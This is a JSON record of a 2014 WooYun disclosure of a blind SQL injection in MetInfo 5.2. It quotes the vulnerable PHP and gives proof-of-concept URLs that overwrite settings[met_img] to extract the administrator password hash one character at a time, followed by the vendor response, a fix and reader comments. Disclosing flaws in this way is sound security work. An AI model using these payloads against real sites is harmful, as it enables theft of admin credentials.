{"id": 4994, "wybug_id": "wooyun-2014-048203", "wybug_title": "MetInfo最新版SQL盲注漏洞", "wybug_corp": "Metinfo企业网站管理系统", "wybug_author": "進撃のDanny", "wybug_date": "2014-01-07 19:36", "wybug_open_date": "2014-04-07 19:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向公众公开  简要描述： MetInfo最新版SQL盲注漏洞，可盲注管理员信息。 详细说明：  D:\\www\\php\\MetInfo5.2\\img\\img.php \n<?php# MetInfo Enterprise Content Management System # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. require_once '../include/common.inc.php';$mdname = 'img';$showname = 'showimg';$dbname = $met_img;$dbname_list = $met_img_list;$mdmendy = 1;$imgproduct = 'img';require_once '../include/global/listmod.php';$img_listnow = $modlistnow;$img_list_new  = $md_list_new;$img_class_new = $md_class_new;$img_list_com  = $md_list_com;$img_class_com = $md_class_com;$img_class     = $md_class;$img_list      = $md_list;require_once '../public/php/imghtml.inc.php';include template('img');footer();# This program is an open source system, commercial use, please consciously to purchase commercial license.# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.?>\n第7行$dbname可以覆盖此变量http://localhost/case/?settings[met_img]=met_admin_table%20or%201=1 -- \n\n来到文件D:\\www\\php\\MetInfo5.2\\include\\global\\listmod.php\nrequire_once substr(dirname(__FILE__), 0, -6).'common.inc.php';require_once '../include/global/pseudo.php';if($dbname!=$met_download&&$dbname!=$met_img&&$dbname!=$met_news&&$dbname!=$met_product){okinfo('../404.html');exit();}if($class_list[$class1]['module']>=100||($class1==0&&$class2==0&&$class3==0)){\tif($search==\"search\"){\t\t$search_module=$imgproduct=='product'?3:5;\t\t$query=\"select * from $met_column where module='$search_module' and (classtype=1 or releclass!=0) and lang='$lang' order by no_order ASC,id ASC\";\t\t$search_coloumn=$db->get_all($query);\t\t$class1=$search_coloumn[0]['id'];\t}else{\n接着进入数据库查询即可导致注入。   漏洞证明：  打开页面http://localhost/case/?settings[met_img]=met_admin_table where substr(left((admin_pass),32),1,1)=char(56)-- 1-----返回空白http://localhost/case/?settings[met_img]=met_admin_table where substr(left((admin_pass),32),1,1)=char(55)-- 1-----返回案例通过返回的信息可以盲注出管理员信息。\n\n   修复方案：  修复变量覆盖   版权声明：转载请注明来源 進撃のDanny@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-12 11:34 厂商回复： CNVD通过本地实例复现，暂未在互联网上有实例复现，由CNVD联系软件生产厂商，向其通报漏洞情况。如后续有互联网实例，也可以进一步提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-07 20:53 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  mark    \n     2014-01-07 22:02 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  还能注的出来?    \n     2014-01-11 15:13 |    \t\t進撃のDanny \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:7        )\t\t \n  @xsser 没想到Metinfo是走的第三方，不得不说这速度也太慢了。    \n     2014-02-04 20:07 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  mark话说metinfo明明把全部请求过滤了，竟然还能够注入！！    \n     2014-04-07 23:16 |    \t\t小城 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 低调，才能活的长久)\t\t \n  厉害    \n     2014-04-07 23:22 |    \t\t小城 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 低调，才能活的长久)\t\t \n  自己写的工具    \n     2014-04-08 10:02 |    \t\twangy3e \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | web security,mobile app security)\t\t \n  厉害     \n     2014-04-18 15:39 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  屌、收藏、    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}